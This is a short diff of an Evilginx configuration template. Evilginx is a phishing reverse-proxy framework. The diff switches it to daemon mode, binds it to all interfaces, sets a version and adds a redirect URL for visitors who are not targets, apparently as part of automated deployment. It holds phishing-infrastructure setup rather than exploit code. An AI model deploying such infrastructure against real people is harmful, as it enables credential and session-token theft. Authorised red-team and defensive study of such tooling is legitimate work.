@@ -1,11 +1,13 @@
-daemon: false
+daemon: true
 debug: true
+version: 3.0.0 # Evilginx 3.3.0 still uses 3.0.0 in its config file
 domain: {{.Domain}}
-ipv4: {{.VpsIp}}
+ipv4: 0.0.0.0
 http_port: 8081
 https_port: 8443
 dns_port: 0
 autocert: false
+redirect_url: https://www.google.com
 phishlets_path: /opt/evilginx/phishlets
 cert_path: /opt/evilginx/certs
 database: /opt/evilginx/evilginx.db
